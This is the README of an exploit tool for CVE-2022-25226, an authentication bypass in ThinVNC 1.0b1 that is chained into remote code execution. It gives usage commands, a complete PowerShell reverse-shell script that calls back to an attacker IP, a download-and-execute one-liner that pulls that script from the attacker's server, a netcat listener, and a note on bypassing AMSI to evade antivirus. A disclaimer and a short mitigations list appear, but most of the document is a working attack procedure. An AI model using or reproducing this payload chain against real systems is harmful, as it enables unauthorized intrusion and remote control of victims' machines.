# ThinVNC 1.0b1 - Authentication Bypass to Remote Code Execution (CVE-2022-25226)

**Author:** krill-x7  
**Reference:** https://fluidattacks.com/advisories/sinatra

---

## Overview

ThinVNC 1.0b1 contains an authentication bypass vulnerability (CVE-2022-25226) allowing remote attackers to interact with the backend unauthenticated. By leveraging exposed `/cmd` endpoints, attackers can simulate keystrokes, open PowerShell, bypass AMSI, and execute arbitrary commands—ultimately leading to Remote Code Execution (RCE).

This script chains those primitives to gain a reverse shell on the target system.

---

## Disclaimer

This code is provided **for educational purposes only**.  
Use it **only on systems you own or are explicitly authorized to test**.

---

## Requirements

- Python 3
- `rev.ps1` reverse shell script hosted on your attacker machine
- A listener (e.g., Netcat) to catch the shell

---

## Usage

```bash
python3 thinvnc_rce.py -t <TARGET_IP> -tp <TARGET_PORT> -a <ATTACKER_IP> -ap <ATTACKER_PORT>
```

---

## Example

```bash
python3 thinvnc_rce.py -t 192.168.1.100 -tp 8080 -a 192.168.1.200 -ap 8000
```

---

## Payload Setup

### 1. Create `rev.ps1`

Save this to a file called `rev.ps1`.  
**Important:** Replace `192.168.1.200` and `8000` with your attacker's IP and listening port.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.200",8000);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
```

---

### 2. Host `rev.ps1`

From the same directory:

```bash
python3 -m http.server 8000
```

---

### 3. Start a Listener

```bash
nc -lvnp 8000
```

---

## Exploit Workflow

1. Get a valid SID using unauthenticated request to `/cmd?cmd=connect`.
2. Start that SID with keyboard/mouse access via `/cmd?cmd=start`.
3. Send `Ctrl+Esc` key combo to open the Start menu.
4. Launch PowerShell in bypass mode.
5. Bypass AMSI to disable PowerShell protections.
6. Execute the reverse shell payload from your HTTP server.

---

## Payload Execution

This is the payload that gets executed in memory:

```powershell
IEX((New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>:<PORT>/rev.ps1'))
```

Replace `<ATTACKER_IP>` and `<PORT>` with your actual IP and port.

---

## Notes

- The payload is executed using clipboard-based command injection.
- AMSI bypass is included to evade PowerShell-based AV detections.
- ThinVNC runs PowerShell with default user permissions—if running as admin, shell is elevated.

---

## Mitigations

- Do not expose ThinVNC to the internet.
- Block `/cmd` endpoint via web server config or WAF.
- Switch to supported, secure alternatives (e.g., Apache Guacamole).
- Monitor PowerShell usage and clipboard injection behavior.

---

## Credits

- Exploit and automation: **krill-x7**
- Vulnerability discovery and advisory: [Fluid Attacks – Advisory Sinatra](https://fluidattacks.com/advisories/sinatra)
